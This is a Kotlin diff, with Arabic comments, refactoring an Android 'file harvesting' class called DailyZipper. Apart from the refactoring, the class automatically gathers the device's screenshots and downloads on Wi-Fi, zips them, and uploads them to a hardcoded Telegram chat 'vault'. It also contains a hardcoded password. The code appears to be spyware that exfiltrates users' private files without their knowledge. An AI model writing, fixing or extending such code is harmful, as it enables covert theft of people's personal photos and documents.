@@ -24,7 +24,8 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - خالية تماماً من أي تعارض مع التعبيرات النمطية
+ * فئة تجميع الملفات وحصادها - الإصدار النهائي الآمن
+ * تم إصلاح تعارض isActive نهائياً
  */
 class DailyZipper(
     context: Context,
@@ -37,7 +38,13 @@ class DailyZipper(
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val activeMutex = Mutex()
-    private val isActive = AtomicBoolean(false)
+
+    /**
+     * تم تغيير الاسم من isActive إلى zipperActive
+     * لتفادي التضارب مع CoroutineScope.isActive داخل scope.launch
+     */
+    private val zipperActive = AtomicBoolean(false)
+
     private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
 
     private var maxBatchSize = 48L * 1024L * 1024L
@@ -81,20 +88,20 @@ class DailyZipper(
     }
 
     init {
-        config.put("max_batch_size", 48L * 1024L * 1024L)
-        config.put("storage_extra", 100L * 1024L * 1024L)
-        config.put("send_retry_delays", listOf(2000L, 4000L, 8000L))
-        config.put("max_processed_hashes", 10000)
-        config.put("default_vault_id", -1003577715762L)
-        config.put("enable_encryption", false)
-        config.put("password", "ShieldCore2024!")
-        config.put("max_batches", 10)
+        config["max_batch_size"] = 48L * 1024L * 1024L
+        config["storage_extra"] = 100L * 1024L * 1024L
+        config["send_retry_delays"] = listOf(2000L, 4000L, 8000L)
+        config["max_processed_hashes"] = 10000
+        config["default_vault_id"] = -1003577715762L
+        config["enable_encryption"] = false
+        config["password"] = "ShieldCore2024!"
+        config["max_batches"] = 10
         loadConfig()
     }
 
     @Suppress("UNCHECKED_CAST")
     private fun <T> getConfigValue(key: String, default: T): T {
-        val value = config.get(key)
+        val value = config[key]
         if (value == null) return default
         return try {
             when (default) {
@@ -155,7 +162,16 @@ class DailyZipper(
                 val key = keys.next()
                 val value = json.opt(key)
                 if (value != null && value != JSONObject.NULL) {
-                    config.put(key, value)
+                    // ✅ إصلاح إضافي: تحويل JSONArray إلى List آمنة
+                    if (value is JSONArray) {
+                        val list = mutableListOf<Any?>()
+                        for (i in 0 until value.length()) {
+                            list.add(value.opt(i))
+                        }
+                        config[key] = list
+                    } else {
+                        config[key] = value
+                    }
                 }
             }
             maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
@@ -255,6 +271,12 @@ class DailyZipper(
 
     private fun isOnWifi(): Boolean {
         val ctx = appContext ?: return true
+
+        // ✅ إصلاح إضافي: للأجهزة أقل من Android 6.0
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+            return true
+        }
+
         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return true
         return try {
             val network = cm.activeNetwork ?: return false
@@ -266,7 +288,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات إلى Telegram - باستخدام التحويل الآمن للخرائط
+    //  إرسال الملفات إلى Telegram
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,21 +323,20 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج قيمة "ok" باستخدام التحويل الآمن للخرائط
+                // ✅ تحويل آمن تماماً لاستخراج قيمة "ok"
                 val success = when (result) {
                     is Boolean -> result
                     is JSONObject -> result.optBoolean("ok", false)
                     is Map<*, *> -> {
-                        var ok = false
-                        @Suppress("UNCHECKED_CAST")
-                        val map = result as Map<Any?, Any?>
-                        for ((key, value) in map) {
-                            if (key?.toString() == "ok") {
-                                ok = value as? Boolean == true
+                        var okValue = false
+                        val entries = result.entries.toList()
+                        for (entry in entries) {
+                            if (entry.key?.toString() == "ok") {
+                                okValue = entry.value as? Boolean == true
                                 break
                             }
                         }
-                        ok
+                        okValue
                     }
                     else -> false
                 }
@@ -340,7 +361,8 @@ class DailyZipper(
 
     fun forceSendNow(chatId: Long? = null): Boolean {
         scope.launch {
-            if (isActive.get()) {
+            // ✅ استخدام zipperActive بدلاً من isActive
+            if (zipperActive.get()) {
                 if (chatId != null && telegram != null) {
                     sendMessage(chatId, "⏳ عملية حصاد جارية بالفعل...")
                 }
@@ -398,8 +420,8 @@ class DailyZipper(
         val maxBatches = cfg.maxBatches
 
         activeMutex.withLock {
-            if (isActive.get()) return false
-            isActive.set(true)
+            if (zipperActive.get()) return false
+            zipperActive.set(true)
         }
 
         try {
@@ -577,7 +599,7 @@ class DailyZipper(
             return successCount > 0
 
         } finally {
-            isActive.set(false)
+            zipperActive.set(false)
             System.gc()
         }
     }
@@ -625,13 +647,14 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - باستخدام التحويل الآمن للخرائط
+    //  التشغيل التلقائي
     // ============================================================
 
     fun run(): Boolean {
         scope.launch {
             activeMutex.withLock {
-                if (isActive.get()) return@launch
+                // ✅ استخدام zipperActive بدلاً من isActive
+                if (zipperActive.get()) return@launch
             }
 
             if (!isOnWifi()) {
@@ -646,20 +669,19 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار باستخدام التحويل الآمن للخرائط
+                            // ✅ استخراج المسار بأمان تام بدون استخدام []
                             val path = when (item) {
                                 is JSONObject -> item.optString("path", "")
                                 is Map<*, *> -> {
-                                    var p = ""
-                                    @Suppress("UNCHECKED_CAST")
-                                    val map = item as Map<Any?, Any?>
-                                    for ((key, value) in map) {
-                                        if (key?.toString() == "path") {
-                                            p = value?.toString() ?: ""
+                                    var foundPath = ""
+                                    val entries = item.entries.toList()
+                                    for (entry in entries) {
+                                        if (entry.key?.toString() == "path") {
+                                            foundPath = entry.value?.toString() ?: ""
                                             break
                                         }
                                     }
-                                    p
+                                    foundPath
                                 }
                                 else -> ""
                             }
@@ -725,17 +747,18 @@ class DailyZipper(
             }
         }
 
-        val result = HashMap<String, Any>()
-        result.put("pending", count)
-        result.put("size", totalSize)
-        return result
+        return hashMapOf(
+            "pending" to count,
+            "size" to totalSize
+        )
     }
 
     private fun sendMessage(chatId: Long, text: String) {
         if (telegram == null) return
-        val params = HashMap<String, Any>()
-        params.put("chat_id", chatId)
-        params.put("text", text)
+        val params = hashMapOf<String, Any>(
+            "chat_id" to chatId,
+            "text" to text
+        )
         invokeMethod(telegram, "api", "sendMessage", params)
     }
 
@@ -743,8 +766,7 @@ class DailyZipper(
         Log.i(TAG, message)
         try {
             val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
-            val logText = "[$timestamp] [INFO] $message\n"
-            logFile.appendText(logText, Charsets.UTF_8)
+            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
         } catch (_: Exception) {}
     }
 
